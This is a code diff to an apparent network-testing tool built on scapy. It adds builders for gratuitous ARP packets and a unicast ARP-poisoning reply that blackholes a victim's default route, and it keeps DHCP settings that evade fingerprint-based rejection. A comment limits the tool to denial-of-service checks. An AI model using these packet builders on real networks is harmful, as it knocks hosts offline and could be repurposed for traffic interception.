@@ -17,6 +17,9 @@ from scapy.all import ARP, BOOTP, DHCP, IP, UDP, Ether, mac2str, str2mac
 # DHCP message-type codes
 DISCOVER, OFFER, REQUEST, DECLINE, ACK, NAK, RELEASE, INFORM = range(1, 9)
 
+# ARP operations
+ARP_REQUEST, ARP_REPLY = 1, 2
+
 # macOS-style parameter-request-list order, from legacy pig.py, to avoid trivial
 # DHCP fingerprint-based rejection by some servers/routers.
 _MACOS_PRL = (1, 121, 3, 6, 15, 119, 252, 95, 44, 46)
@@ -117,10 +120,34 @@ def build_inform_v4(mac: str, ciaddr: str, xid: int, request_options=None) -> Et
     )
 
 
-def build_garp(ip: str, mac: str) -> Ether:
-    """Gratuitous ARP claiming `ip` from `mac` — used to knock a host offline."""
+def build_garp(ip: str, mac: str, op: int = 1) -> Ether:
+    """Gratuitous ARP announcing that `ip` lives at `mac` (psrc == pdst).
+
+    Both forms exist in the wild and stacks differ in which they honour — Linux with
+    `arp_accept=0` updates an *existing* entry but won't create one, and some stacks only act
+    on the reply form. Senders therefore emit both:
+      op=1  ARP request  ("who has <ip>? tell <ip>") — the classic announcement
+      op=2  ARP reply    (unsolicited "<ip> is at <mac>")
+    """
+    hwdst = "00:00:00:00:00:00" if op == ARP_REQUEST else "ff:ff:ff:ff:ff:ff"
     return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
-        hwsrc=mac, psrc=ip, hwdst="00:00:00:00:00:00", pdst=ip
+        op=op, hwsrc=mac, psrc=ip, hwdst=hwdst, pdst=ip
+    )
+
+
+def build_arp_poison(claim_ip: str, claim_mac: str, victim_ip: str, victim_mac: str) -> Ether:
+    """Unicast ARP reply telling one victim that `claim_ip` is at `claim_mac`.
+
+    Directed at a single host, so it lands in that host's cache rather than relying on it to
+    honour a broadcast. Used to blackhole a victim's default route by pointing the gateway IP
+    at an unused MAC.
+
+    NOTE (whitehat boundary): `claim_mac` must always be a bogus/unused address so the traffic
+    is dropped. Never point it at our own MAC — that would turn a denial-of-service check into
+    traffic interception, which is out of scope for this tool.
+    """
+    return Ether(src=claim_mac, dst=victim_mac) / ARP(
+        op=ARP_REPLY, hwsrc=claim_mac, psrc=claim_ip, hwdst=victim_mac, pdst=victim_ip
     )
 
 
